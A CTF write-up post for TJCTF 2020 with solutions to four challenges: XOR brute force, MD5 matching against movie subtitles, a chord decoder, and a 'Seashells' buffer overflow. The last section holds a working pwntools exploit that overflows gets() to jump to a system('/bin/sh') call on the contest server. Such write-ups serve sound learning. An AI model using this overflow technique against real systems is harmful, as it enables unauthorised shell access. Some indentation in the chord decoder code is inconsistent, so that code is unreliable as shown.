# TJCTF 2020

A very nice ctf, StarLabs managed to get 1050 points. I have included some of the writeups here.

### Is this crypto ?

XOR each character with a number to get to range of ASCII.

``` python
a = "Òãèáåþöãðáùè±øâ±ð±õøâòøáýøÿô±åùðå±ùðâ±óôôÿ±ðãþäÿõ±÷þã±àäøåô±ð±ýþÿö±åøüô½±óäå±øÿ±ãôòôÿå±åøüôâ±øå±ùðâ±âôôÿ±ðÿ±ôéáýþâøþÿ±þ÷±ãôâôðãòù±ðÿõ±øüáýôüôÿåðåøþÿ¿±Åùøâ±õøâòøáýøÿô±âôôúâ±åþ±áãþçøõô±âôòäãô±òþüüäÿøòðåøþÿ±ðÿõ±âùðãôõ±õðåð±âåþãðöô±äâøÿö±áäóýøò±úôè±òãèáåþöãðáùè½±æùøòù±ôââôÿåøðýýè±ãôõäòôâ±åùô±õðüðöô±åùðå±òðÿ±óô±õþÿô±åùãþäöù±ôÿòãèáåøþÿ¿››åûòå÷êÿ¡Îåù ¤ÎøâÎúèý¢ì››Åùô±Õðåð±Òôÿåãô±Âåðÿõðãõ±÷þã±Òþÿ÷øõôÿåøðýøåè±ðÿõ±Øÿåôöãøåè±âåðåôâ±åùðå±ð±òþüáäåôã±âèâåôü±üäâå±ÿþå±òþÿåðøÿ±ðÿè±øÿ÷þãüðåøþÿ±åùðå±òðÿÿþå±óô±áãþçøõôõ±ðå±åùô±åøüô±þ÷±ãôàäôâåøÿö±øå¿±Åùô±áäãáþâô±þ÷±åùøâ±âåðÿõðãõ±øâ±åþ±ôÿâäãô±åùðå±ÿþ±õðåð±÷ãþü±ð±òþÿÿôòåôõ±òþüáäåôã±âèâåôü±òðÿ±óô±ðòòôââôõ±óè±ðÿ±äÿðäåùþãøâôõ±áðãåè¿±Åùøâ±æþäýõ±ðýýþæ±äâôãâ±åþ±áãþåôòå±åùôøã±õðåð±ðÿõ±üðúô±åùôøã±áôãâþÿðý±øÿ÷þãüðåøþÿ±âôòäãô½±æùøòù±øâ±üþãô±øüáþãåðÿå±åùðÿ±ôçôã¿"
for i in range(256):
	x = ''.join(list(map(chr, list(map(lambda x: ord(x)^i , a)))))
	if 'tjctf' in x:
		print(i)
		print(x)
# tjctf{n0_th15_is_kyl3}
```

### Titanic

Wrap a lowercase word from a sentence that had been in said in the movie Titanic (1997) and match it with a given md5 hash to get the flag.
I downloaded subtitles of the movie from the internet, and removed the full stop.

``` python
import re
with open('titanic.txt') as h:
	w = h.read()
	w = re.sub(r'[.]*',r'',w)
	w = w.lower()
	w = w.split()
import hashlib
hashlist = []
for word in w:
	word = 'tjctf{' + word + '}'
	hashes = hashlib.md5(word.encode()).hexdigest()
	if hashes == '9326ea0931baf5786cde7f280f965ebb':
		print(word)
		break
		# tjctf{marlborough's}
```

### Seashells

Given a binary, we can overflow the gets function to jump to the system() call in the shell function.
```c
int main() {
    setbuf(*stdout@@GLIBC_2.2.5, 0x0);
    setbuf(*stdin@@GLIBC_2.2.5, 0x0);
    setbuf(*stderr@@GLIBC_2.2.5, 0x0);
    puts("Welcome to Sally's Seashore Shell Shop");
    puts("Would you like a shell?");
    gets(&var_A);
    rax = strcasecmp(&var_A, 0x40086f);
    if (rax != 0x0) {
            puts("why are you even here?");
    }
    else {
            puts("sorry, we are out of stock");
    }
    return 0x0;
}
```

```c
int shell(int arg0) {
    rax = 0xdeadcafebabebeef;
    if (arg0 == rax) {
            rax = system("/bin/sh");
    }
    return rax;
}
```

```python
from pwn import *
binsh = 0x4006E3
_r = 0xA+8
r = remote('p1.tjctf.org', 8009)
r.sendlineafter('?\n', _r*b'A' + p64(binsh))
r.interactive()
```


### Chord encoder

So someone as encoded each character of his song with a chord. We can do decoded this, we know what each character would look like in a chord.txt (list type object "chord" in the code). What we can do is, we can made a empty variable and keeping try all the printable characters (from the hint) and if it matches, we can add it to a variable flag. There was one issue with this code that, I had to replace "M" with underscore, as they both end with same number (0 afai remeber) and same with "D".

```python
import string
chord = ["A 0112",
"B 2110",
"C 1012",
"D 020",
"E 0200",
"F 1121",
"G 001",
"a 0122",
"b 2100",
"c 1002",
"d 010",
"e 0100",
"f 1011",
"g 000"
]
l = {'1':'A', '2':'B', '3':'C', '4':'D', '5':'E', '6':'F', '7':'G'}
chords = {}
for i in chord:
	c, n = i.strip().split()
	chords[c] = n
def solve():
	s_flag = "1121112111211002112101121121001001210000101221121011200102000110120200101100100111211011001020020010111012011202001011112110121121011211211002112110020200101111210112020010111121010112102001121100211211011020020001010"
	song_so_far = "flag{zats_wot_1_call_a_me"
	alphabets = string.printable
	while 1:
		for alphabet in alphabets:
			flag = 0
			flag2 = 0
			trying_song = song_so_far + alphabet
			print(f"Trying {trying_song}")
			s = ''
			for i in trying_song:
				c1, c2 = hex(ord(i))[2:]
				# num = 0xab, c1 = a, c2 = b
				if c1 in l:
					c1 = l[c1]
				if c2 in l:
					c2 = l[c2]
				try:
					s += chords[c1] + chords[c2]
				except KeyError as e:
					flag = 1
            if flag != 1 :
                if s_flag.startswith(s):
                    song_so_far += alphabet
                    print(f'Song so far : {song_so_far}')
                    print(s)
                    print(s_flag)
                    break
solve()
# flag{zats_wot_1_call_a_meloD}
```